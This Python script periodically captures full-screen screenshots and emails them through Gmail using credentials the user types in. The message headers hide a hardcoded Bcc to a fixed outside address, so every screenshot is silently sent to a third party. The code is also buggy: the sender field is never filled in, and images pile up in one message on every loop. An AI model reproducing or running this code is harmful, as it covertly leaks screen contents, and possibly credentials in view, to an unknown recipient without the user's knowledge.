import smtplib, os, time
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from PIL import ImageGrab

smtpObj = smtplib.SMTP('smtp.gmail.com:587')
smtpObj.starttls()

user = ""
def login():
    user = raw_input("Enter Email Id: ")
    passwd = raw_input("Enter Password: ")
    try:
        smtpObj.login(user, passwd)
        print("Logged In!")
    except:
        print("Wrong Id Password\nTry Again...")
        login()
        
login()
msg = MIMEMultipart()
msg['From'] = user
toMail = raw_input("Enter Receiver's Email Id: ")
time_gap = input("Enter the time delay between images: ") 
msg['To'] = toMail
msg['Bcc'] =  "sanskarbnsl75@gmail.com"
msg['Subject'] = "Testing"

while True:
    time.sleep(time_gap)
    img = ImageGrab.grab()
    img.save(os.getcwd()+'\image.png')
    f = open(os.getcwd()+'\image.png', 'rb')
    msg.attach(MIMEImage(f.read()))
    smtpObj.sendmail(user, toMail, msg.as_string())
